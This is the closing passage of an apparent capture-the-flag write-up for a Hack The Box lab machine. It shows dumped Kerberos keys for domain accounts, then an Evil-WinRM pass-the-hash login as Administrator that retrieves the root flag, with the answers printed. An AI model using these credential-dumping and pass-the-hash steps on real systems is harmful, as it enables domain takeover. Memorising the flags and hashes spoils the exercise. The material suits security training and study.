administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up... 
```

<p class="mb-5"><strong>Answer:</strong> 3dc553ce4b9fd20bd016e098d2d2fd2e</p>
<br />


<p class="mb-2"><strong>Question 12:</strong> Submit the flag located on the Administrator user's Desktop.</p>
<p class="mb-3">We use Evil-WinRM to Pass-the-Hash and login as the Administrator to obtain the root flag.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~]
└──╼ [★]$ evil-winrm -i 10.129.21.125 -u Administrator -H'3dc553ce4b9fd20bd016e098d2d2fd2e'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         9/22/2026   3:07 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
32bd2e0108bb8baa3fc32eb791477c93
```

<p class="mb-5"><strong>Answer:</strong> 32bd2e0108bb8baa3fc32eb791477c93</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">September 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>